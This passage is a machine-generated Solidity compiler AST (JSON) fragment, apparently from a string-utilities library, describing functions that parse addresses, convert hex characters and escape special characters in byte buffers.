t160_$","typeString":"type(uint160)"},"typeName":{"id":1374,"name":"uint160","nodeType":"ElementaryTypeName","src":"16054:7:3","typeDescriptions":{}}},"id":1377,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"16054:10:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint160","typeString":"uint160"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint160","typeString":"uint160"}],"id":1373,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"16046:7:3","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1372,"name":"address","nodeType":"ElementaryTypeName","src":"16046:7:3","typeDescriptions":{}}},"id":1378,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"16046:19:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"id":1379,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"16042:24:3","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_address_$","typeString":"tuple(bool,address)"}},"functionReturnParameters":1301,"id":1380,"nodeType":"Return","src":"16035:31:3"}]}}]},"documentation":{"id":1289,"nodeType":"StructuredDocumentation","src":"15020:226:3","text":" @dev Variant of {parseAddress-string-uint256-uint256} that returns false if the parsing fails because input is not a properly\n formatted address. See {parseAddress-string-uint256-uint256} requirements."},"id":1392,"implemented":true,"kind":"function","modifiers":[],"name":"tryParseAddress","nameLocation":"15260:15:3","nodeType":"FunctionDefinition","parameters":{"id":1296,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1291,"mutability":"mutable","name":"input","nameLocation":"15299:5:3","nodeType":"VariableDeclaration","scope":1392,"src":"15285:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1290,"name":"string","nodeType":"ElementaryTypeName","src":"15285:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":1293,"mutability":"mutable","name":"begin","nameLocation":"15322:5:3","nodeType":"VariableDeclaration","scope":1392,"src":"15314:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1292,"name":"uint256","nodeType":"ElementaryTypeName","src":"15314:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1295,"mutability":"mutable","name":"end","nameLocation":"15345:3:3","nodeType":"VariableDeclaration","scope":1392,"src":"15337:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1294,"name":"uint256","nodeType":"ElementaryTypeName","src":"15337:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"15275:79:3"},"returnParameters":{"id":1301,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1298,"mutability":"mutable","name":"success","nameLocation":"15383:7:3","nodeType":"VariableDeclaration","scope":1392,"src":"15378:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1297,"name":"bool","nodeType":"ElementaryTypeName","src":"15378:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":1300,"mutability":"mutable","name":"value","nameLocation":"15400:5:3","nodeType":"VariableDeclaration","scope":1392,"src":"15392:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1299,"name":"address","nodeType":"ElementaryTypeName","src":"15392:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"15377:29:3"},"scope":1631,"src":"15251:889:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1451,"nodeType":"Block","src":"16209:461:3","statements":[{"assignments":[1400],"declarations":[{"constant":false,"id":1400,"mutability":"mutable","name":"value","nameLocation":"16225:5:3","nodeType":"VariableDeclaration","scope":1451,"src":"16219:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":1399,"name":"uint8","nodeType":"ElementaryTypeName","src":"16219:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"}],"id":1405,"initialValue":{"arguments":[{"id":1403,"name":"chr","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1394,"src":"16239:3:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes1","typeString":"bytes1"}],"id":1402,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"16233:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_uint8_$","typeString":"type(uint8)"},"typeName":{"id":1401,"name":"uint8","nodeType":"ElementaryTypeName","src":"16233:5:3","typeDescriptions":{}}},"id":1404,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"16233:10:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"VariableDeclarationStatement","src":"16219:24:3"},{"id":1448,"nodeType":"UncheckedBlock","src":"16403:238:3","statements":[{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":1412,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint8","typeString":"uint8"},"id":1408,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1406,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1400,"src":"16431:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"3437","id":1407,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"16439:2:3","typeDescriptions":{"typeIdentifier":"t_rational_47_by_1","typeString":"int_const 47"},"value":"47"},"src":"16431:10:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint8","typeString":"uint8"},"id":1411,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1409,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1400,"src":"16445:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"hexValue":"3538","id":1410,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"16453:2:3","typeDescriptions":{"typeIdentifier":"t_rational_58_by_1","typeString":"int_const 58"},"value":"58"},"src":"16445:10:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"16431:24:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":1423,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint8","typeString":"uint8"},"id":1419,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1417,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1400,"src":"16491:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"3936","id":1418,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"16499:2:3","typeDescriptions":{"typeIdentifier":"t_rational_96_by_1","typeString":"int_const 96"},"value":"96"},"src":"16491:10:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint8","typeString":"uint8"},"id":1422,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1420,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1400,"src":"16505:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"hexValue":"313033","id":1421,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"16513:3:3","typeDescriptions":{"typeIdentifier":"t_rational_103_by_1","typeString":"int_const 103"},"value":"103"},"src":"16505:11:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"16491:25:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":1434,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint8","typeString":"uint8"},"id":1430,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1428,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1400,"src":"16552:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"3634","id":1429,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"16560:2:3","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"16552:10:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint8","typeString":"uint8"},"id":1433,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1431,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1400,"src":"16566:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"hexValue":"3731","id":1432,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"16574:2:3","typeDescriptions":{"typeIdentifier":"t_rational_71_by_1","typeString":"int_const 71"},"value":"71"},"src":"16566:10:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"16552:24:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"expression":{"expression":{"arguments":[{"id":1441,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"16620:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_uint8_$","typeString":"type(uint8)"},"typeName":{"id":1440,"name":"uint8","nodeType":"ElementaryTypeName","src":"16620:5:3","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint8_$","typeString":"type(uint8)"}],"id":1439,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"16615:4:3","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":1442,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"16615:11:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint8","typeString":"type(uint8)"}},"id":1443,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"16627:3:3","memberName":"max","nodeType":"MemberAccess","src":"16615:15:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"functionReturnParameters":1398,"id":1444,"nodeType":"Return","src":"16608:22:3"},"id":1445,"nodeType":"IfStatement","src":"16548:82:3","trueBody":{"expression":{"id":1437,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1435,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1400,"src":"16578:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"Assignment","operator":"-=","rightHandSide":{"hexValue":"3535","id":1436,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"16587:2:3","typeDescriptions":{"typeIdentifier":"t_rational_55_by_1","typeString":"int_const 55"},"value":"55"},"src":"16578:11:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"id":1438,"nodeType":"ExpressionStatement","src":"16578:11:3"}},"id":1446,"nodeType":"IfStatement","src":"16487:143:3","trueBody":{"expression":{"id":1426,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1424,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1400,"src":"16518:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"Assignment","operator":"-=","rightHandSide":{"hexValue":"3837","id":1425,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"16527:2:3","typeDescriptions":{"typeIdentifier":"t_rational_87_by_1","typeString":"int_const 87"},"value":"87"},"src":"16518:11:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"id":1427,"nodeType":"ExpressionStatement","src":"16518:11:3"}},"id":1447,"nodeType":"IfStatement","src":"16427:203:3","trueBody":{"expression":{"id":1415,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1413,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1400,"src":"16457:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"Assignment","operator":"-=","rightHandSide":{"hexValue":"3438","id":1414,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"16466:2:3","typeDescriptions":{"typeIdentifier":"t_rational_48_by_1","typeString":"int_const 48"},"value":"48"},"src":"16457:11:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"id":1416,"nodeType":"ExpressionStatement","src":"16457:11:3"}}]},{"expression":{"id":1449,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1400,"src":"16658:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"functionReturnParameters":1398,"id":1450,"nodeType":"Return","src":"16651:12:3"}]},"id":1452,"implemented":true,"kind":"function","modifiers":[],"name":"_tryParseChr","nameLocation":"16155:12:3","nodeType":"FunctionDefinition","parameters":{"id":1395,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1394,"mutability":"mutable","name":"chr","nameLocation":"16175:3:3","nodeType":"VariableDeclaration","scope":1452,"src":"16168:10:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"},"typeName":{"id":1393,"name":"bytes1","nodeType":"ElementaryTypeName","src":"16168:6:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"visibility":"internal"}],"src":"16167:12:3"},"returnParameters":{"id":1398,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1397,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1452,"src":"16202:5:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":1396,"name":"uint8","nodeType":"ElementaryTypeName","src":"16202:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"}],"src":"16201:7:3"},"scope":1631,"src":"16146:524:3","stateMutability":"pure","virtual":false,"visibility":"private"},{"body":{"id":1617,"nodeType":"Block","src":"17336:1331:3","statements":[{"assignments":[1461],"declarations":[{"constant":false,"id":1461,"mutability":"mutable","name":"buffer","nameLocation":"17359:6:3","nodeType":"VariableDeclaration","scope":1617,"src":"17346:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1460,"name":"bytes","nodeType":"ElementaryTypeName","src":"17346:5:3","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"id":1466,"initialValue":{"arguments":[{"id":1464,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1455,"src":"17374:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1463,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"17368:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":1462,"name":"bytes","nodeType":"ElementaryTypeName","src":"17368:5:3","typeDescriptions":{}}},"id":1465,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"17368:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"nodeType":"VariableDeclarationStatement","src":"17346:34:3"},{"assignments":[1468],"declarations":[{"constant":false,"id":1468,"mutability":"mutable","name":"output","nameLocation":"17403:6:3","nodeType":"VariableDeclaration","scope":1617,"src":"17390:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1467,"name":"bytes","nodeType":"ElementaryTypeName","src":"17390:5:3","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"id":1476,"initialValue":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1474,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":1471,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"17422:1:3","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"expression":{"id":1472,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1461,"src":"17426:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1473,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"17433:6:3","memberName":"length","nodeType":"MemberAccess","src":"17426:13:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"17422:17:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1470,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"NewExpression","src":"17412:9:3","typeDescriptions":{"typeIdentifier":"t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$","typeString":"function (uint256) pure returns (bytes memory)"},"typeName":{"id":1469,"name":"bytes","nodeType":"ElementaryTypeName","src":"17416:5:3","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}}},"id":1475,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"17412:28:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"nodeType":"VariableDeclarationStatement","src":"17390:50:3"},{"assignments":[1478],"declarations":[{"constant":false,"id":1478,"mutability":"mutable","name":"outputLength","nameLocation":"17481:12:3","nodeType":"VariableDeclaration","scope":1617,"src":"17473:20:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1477,"name":"uint256","nodeType":"ElementaryTypeName","src":"17473:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1480,"initialValue":{"hexValue":"30","id":1479,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"17496:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"nodeType":"VariableDeclarationStatement","src":"17473:24:3"},{"body":{"id":1609,"nodeType":"Block","src":"17548:854:3","statements":[{"assignments":[1492],"declarations":[{"constant":false,"id":1492,"mutability":"mutable","name":"char","nameLocation":"17569:4:3","nodeType":"VariableDeclaration","scope":1609,"src":"17562:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"},"typeName":{"id":1491,"name":"bytes1","nodeType":"ElementaryTypeName","src":"17562:6:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"visibility":"internal"}],"id":1500,"initialValue":{"arguments":[{"arguments":[{"id":1496,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1461,"src":"17606:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":1497,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1482,"src":"17614:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1495,"name":"_unsafeReadBytesOffset","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1630,"src":"17583:22:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes_memory_ptr_$_t_uint256_$returns$_t_bytes32_$","typeString":"function (bytes memory,uint256) pure returns (bytes32)"}},"id":1498,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"17583:33:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1494,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"17576:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes1_$","typeString":"type(bytes1)"},"typeName":{"id":1493,"name":"bytes1","nodeType":"ElementaryTypeName","src":"17576:6:3","typeDescriptions":{}}},"id":1499,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"17576:41:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"VariableDeclarationStatement","src":"17562:55:3"},{"condition":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1512,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1509,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1501,"name":"SPECIAL_CHARS_LOOKUP","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":282,"src":"17637:20:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"&","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1507,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":1502,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"17661:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"arguments":[{"id":1505,"name":"char","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1492,"src":"17672:4:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes1","typeString":"bytes1"}],"id":1504,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"17666:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_uint8_$","typeString":"type(uint8)"},"typeName":{"id":1503,"name":"uint8","nodeType":"ElementaryTypeName","src":"17666:5:3","typeDescriptions":{}}},"id":1506,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"17666:11:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"src":"17661:16:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":1508,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"17660:18:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"17637:41:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":1510,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"17636:43:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"hexValue":"30","id":1511,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"17683:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"17636:48:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"id":1513,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"17635:50:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"id":1607,"nodeType":"Block","src":"18330:62:3","statements":[{"expression":{"id":1605,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":1600,"name":"output","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1468,"src":"18348:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1603,"indexExpression":{"id":1602,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"18355:14:3","subExpression":{"id":1601,"name":"outputLength","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1478,"src":"18355:12:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"18348:22:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":1604,"name":"char","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1492,"src":"18373:4:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"src":"18348:29:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":1606,"nodeType":"ExpressionStatement","src":"18348:29:3"}]},"id":1608,"nodeType":"IfStatement","src":"17631:761:3","trueBody":{"id":1599,"nodeType":"Block","src":"17687:637:3","statements":[{"expression":{"id":1519,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":1514,"name":"output","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1468,"src":"17705:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes 